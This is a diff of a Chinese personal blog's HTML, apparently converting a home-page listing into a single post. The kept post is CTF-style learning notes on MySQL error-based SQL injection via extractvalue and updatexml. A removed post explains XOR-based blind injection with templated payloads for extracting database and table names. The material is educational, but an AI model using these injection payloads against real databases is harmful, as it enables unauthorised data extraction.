@@ -165,48 +165,13 @@
                 </div>
 
                 <div id="main">
-                    <div id="home-head" style=background-image:url('2023-06-13_23.56.29.png')>
-    <script>
-        var menu = document.getElementById("menu")
-        menu.className += " menu-color"
-    </script>
-     
-    <div id="home-info" class="home-info" @click="home_click">
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="info">
-            <div class="wrap">
-                <h1>FHK_KMD终晨</h1>
-                <h3>_coding_</h3>
-                <h5>所有所得所获,不如一夜星空 ------<<三体导读>></h5>
-            </div>
-        </span>
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1> </h1>
     </div>
-     
-</div>
-
-
-
-<div id="home-posts-wrap" class=>
-    <div id="home-posts">
-
-        <div id="posts">
-            
-
-<div class="post">
-
-    <a href="/2024/09/23/sql注入之报错注入/">
-        <h2>
-            
-        </h2>
-    </a>
-
-    <div class="category-and-date">
-
-        
-
+    <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
@@ -214,13 +179,13 @@
             2024/9/23
         </span>
 
+        
+
+        
     </div>
 
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            
-            <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。<br>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code>  </p>
+    <div class="content" v-pre>
+        <h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。<br>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code>  </p>
 <h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5  </p>
 <h6 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h6><blockquote>
 <p>函数原型：<code>extractvalue(xml_document,Xpath_string)    正常语法：</code>extractvalue(xml_document,Xpath_string);<br> 第一个参数：<code>xml_document</code>是string格式，为xml文档对象的名称<br> 第二个参数：<code>Xpath_string</code>是xpath格式的字符串<br> 作用：从目标xml中返回包含所查询值的字符串</p>
@@ -293,320 +258,13 @@ id=&#39;and(select extractvalue(1,concat(0x7e,@@version)))
 <p>不能使用group_concat函数，所以用limit语句来限制查询结果的列数</p>
 <h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a><br><a target="_blank" rel="noopener" href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a><br><a target="_blank" rel="noopener" href="http://lawlietweb.com/2017/11/12/error-base/">http://lawlietweb.com/2017/11/12/error-base/</a></p>
 
-            
-        </div>
     </div>
 
-    <div class="post-tags">
-        
-        
-    </div>
-
-    <a href="/2024/09/23/sql注入之报错注入/ " class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-
-    <a href="/2024/09/23/sql注入漏洞之异或注入/">
-        <h2>
-            
-        </h2>
-    </a>
-
-    <div class="category-and-date">
-
-        
-
-        <span class="date">
-            <span class="icon">
-                <a-icon type="calendar" theme="filled" />
-            </span>
-            2024/9/23
-        </span>
-
-    </div>
-
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            
-            <p>在介绍异或注入之前，先看看这个</p>
-<pre><code>mysql&gt; select &#39;aaa&#39;=0;
-+---------+
-| &#39;aaa&#39;=0 |
-+---------+
-|       1 |
-+---------+
-1 row in set, 1 warning (0.00 sec)
-#这里可以看到返回结果是1，表示true
-
-mysql&gt; select &#39;aaa&#39;=1;
-+---------+
-| &#39;aaa&#39;=1 |
-+---------+
-|       0 |
-+---------+
-1 row in set, 1 warning (0.00 sec)
-#但这里返回的是false
-</code></pre>
-<p>查阅了相关文档后，发现这样一个特性。</p>
-<p><strong>在做string和数字型的值比较的时候，string会转换成数字，对于前面是数字的字符串，转换的时候就是转换成前面的数字，而前面不是以数字开头的字符串，转换的时候自然就是转换成0了，可以再看看下面两个例子。</strong></p>
-<pre><code>mysql&gt; select &#39;1aaa&#39;=1;
-+----------+
-| &#39;1aaa&#39;=1 |
-+----------+
-|        1 |
-+----------+
-1 row in set, 1 warning (0.00 sec)
-
-mysql&gt; select &#39;12aaa&#39;=1;
-+-----------+
-| &#39;12aaa&#39;=1 |
-+-----------+
-|         0 |
-+-----------+
-1 row in set, 1 warning (0.00 sec)
-</code></pre>
-<p>下面进入正题</p>
-<h2 id="什么是异或注入"><a href="#什么是异或注入" class="headerlink" title="什么是异或注入"></a>什么是异或注入</h2><p>异步注入说简单一点就是在构造where后面的判断条件时使用^（异或符号）来达到sql注入攻击的目的，通常异步注入与一些自动化脚本比如bp中的intrude模块或者自己写一个python脚本来配合使用。可以来看个例子。    </p>
-<pre><code>mysql&gt; select * from student;
-+-----------+--------+------+------+-------+
-| Sno       | Sname  | Ssex | Sage | Sdept |
-+-----------+--------+------+------+-------+
-| 201215121 | 李勇   | 男   |   23 | CS    |
-| 201215122 | 刘晨   | 女   |   20 | CS    |
-| 201215123 | 王敏   | 女   |   19 | MA    |
-| 201215125 | 张立   | 男   |   20 | IS    |
-| 200215128 | 陈冬   | 男   |   19 | IS    |
-| 201515000 | 小赵   | 男   |   31 | IS    |
-| 201515001 | 小钱   | 女   |   29 | MA    |
-| 201515002 | 小孙   | 男   |   34 | MJ    |
-| 201515003 | 小李   | 女   |   26 | CS    |
-| 201515004 | 小周   | 男   |   42 | LI    |
-+-----------+--------+------+------+-------+
-10 rows in set (0.07 sec)
-
-#这个是student表的内容
-</code></pre>
-<p>但如果我这样构造sql查询语句的话</p>
-<pre><code>mysql&gt; select * from student where Sname=&#39;李勇&#39;^1;
-Empty set, 11 warnings (1.65 sec)
-
-mysql&gt; select * from student where Sname=&#39;李勇&#39;^0;
-+-----------+--------+------+------+-------+
-| Sno       | Sname  | Ssex | Sage | Sdept |
-+-----------+--------+------+------+-------+
-| 201215121 | 李勇   | 男   |   23 | CS    |
-| 201215122 | 刘晨   | 女   |   20 | CS    |
-| 201215123 | 王敏   | 女   |   19 | MA    |
-| 201215125 | 张立   | 男   |   20 | IS    |
-| 200215128 | 陈冬   | 男   |   19 | IS    |
-| 201515000 | 小赵   | 男   |   31 | IS    |
-| 201515001 | 小钱   | 女   |   29 | MA    |
-| 201515002 | 小孙   | 男   |   34 | MJ    |
-| 201515003 | 小李   | 女   |   26 | CS    |
-| 201515004 | 小周   | 男   |   42 | LI    |
-+-----------+--------+------+------+-------+
-10 rows in set, 11 warnings (0.00 sec)
-</code></pre>
-<p><strong>为什么会是这个结果呢？</strong><br>首先’李勇’^1做异或运算，结果会是1，因为该字符串转换成数字就是0，然后看看Sname&#x3D;0这个表达式，我们不妨把每个元组都拿过来一个一个比较，每个元组的Sname转换成数字都是0，所以对于每个元组，该where后面的判断条件全部都是成立的，而Sname&#x3D;1这个表达式自然就是都不成立。</p>
-<h2 id="如何利用异或运算来进行注入？"><a href="#如何利用异或运算来进行注入？" class="headerlink" title="如何利用异或运算来进行注入？"></a>如何利用异或运算来进行注入？</h2><p>我们可以构造一条这样的sql语句</p>
-<pre><code>mysql&gt; select * from student where Sname=&#39;李勇&#39;^(length(database())!=$变量$);
-</code></pre>
-<p>通过构造这样类似的sql语句就可以得到当前数据库名的长度，也可以将语句稍微改改，通过脚本爆破出数据库名表名等，这里我就不演示太多了。</p>
-<pre><code>#查询数据库名
-mysql&gt; select * from student where Sname=&#39;李勇&#39;^(substr(database(),$变量1$,1)!=$变量2$);
-
-#查询表名
-mysql&gt; select * from student where Sname=&#39;李勇&#39;^(substr((select table_name from information_schema.tables where table_schema=database() limit $变量1$,1),$变量2$,1)!=$变量3$);
-</code></pre>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通常目标服务器没有对^符号进行过滤的时候，都可以尝试使用异或注入。之前我就遇到了一个把and,or,||,&amp;&amp;,union,select,注释等这些关键字都给过滤了的靶机，不过没有过滤掉异或符号，如果不知道有异或注入这种操作，这个靶机估计又要卡好久。。。学网安感觉很难有成就感，这并不是学一段时间就能做出一个东西出来的一门学科，并且很难看到自己的进步，每次做ctf的题目或是靶机，总能遇到以前从来没有见过的技术。麻了，睡觉去了。</p>
-
-            
-        </div>
-    </div>
-
-    <div class="post-tags">
-        
-        
-    </div>
-
-    <a href="/2024/09/23/sql注入漏洞之异或注入/ " class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-
-    <a href="/2024/09/23/测试文章/">
-        <h2>
-            测试文章
-        </h2>
-    </a>
-
-    <div class="category-and-date">
-
-        
-
-        <span class="date">
-            <span class="icon">
-                <a-icon type="calendar" theme="filled" />
-            </span>
-            2024/9/23
-        </span>
-
-    </div>
-
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            
-            <h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>![[Pasted image 20240916002843.png]]</p>
-
-            
-        </div>
-    </div>
-
-    <div class="post-tags">
-        
-        
-    </div>
-
-    <a href="/2024/09/23/测试文章/ " class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-
-    <a href="/2023/06/15/绛春城文选-639/">
-        <h2>
-            绛春城文选 639
-        </h2>
-    </a>
-
-    <div class="category-and-date">
-
-        
-
-        <span class="date">
-            <span class="icon">
-                <a-icon type="calendar" theme="filled" />
-            </span>
-            2023/6/15
-        </span>
-
-    </div>
-
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            
-            <p>棠虾赤.游鄂          v1.0    by FHK_KMD终晨<br>粼粼楚水两汉路，繁华处，几曾都。雪柳裙群芙莺肤，笑语常驻，行客意足。<br>昭君广场屈原墓，千年怨，至今孤。庄王问鼎，辛亥逐鹿。江心星如鼓，街上人踟蹰。<br>                                -&gt;游 楚河汉街 作  </p>
-
-            
-        </div>
-    </div>
-
-    <div class="post-tags">
-        
-        
-    </div>
-
-    <a href="/2023/06/15/绛春城文选-639/ " class="go-post">
-        阅读全文
-    </a>
-</div>
-
-
-             
-<div class="page-current">
-
-    <div class="prev">
-        
-    </div>
-
-    <div class="page-index">
-
-        
-
-        <span class="current">
-            1
-        </span>
-
-        
-
-    </div>
-
-    <div class="next">
-        
-    </div>
-
-</div>
-
-        </div>
-    </div>
     
-    <div id="home-card">
-        <a-affix :offset-top="card_top">
-    <a-card class="card-style" style="width: 300px">
-        <div class="avatar">
-            <img src="images/avatar.png " alt="头像">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
         </div>
-        <div class="name">
-            FHK_KMD6377
-        </div>
-        <div class="descriptions">
-            
-            <div class="description">
-                <FHK_KMD终晨>
-            </div>
-            
-            <div class="description">
-                一个湮汲者的空间
-            </div>
-            
-            <div class="description">
-                FHK LONG LIVE!!!
-            </div>
-            
-        </div>
-        <div class="icon-links">
-            
-            <span class="icon-link">
-                <a target="_blank" rel="noopener" href="https://github.com">
-
-                    
-                    <a-icon type="github"
-                        theme="filled" />
-                    
-                </a>
-            </span>
-            
-            <span class="icon-link">
-                <a target="_blank" rel="noopener" href="https://twitter.com">
-
-                    
-                    <a-icon type="twitter"
-                        theme="" />
-                    
-                </a>
-            </span>
-            
-        </div>
-        <div class="friend-links">
-            
-            <div class="friend-link">
-                <a target="_blank" rel="noopener" href="https://space.bilibili.com/413008744">
-                    Bilibili
-                </a>
-            </div>
-            
-        </div>
-    </a-card>
-</a-affix>
     </div>
     
 </div>
@@ -672,6 +330,21 @@ mysql&gt; select * from student where Sname=&#39;李勇&#39;^(substr((select tab
             }
         }
     })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
 </script>
 
 </body>
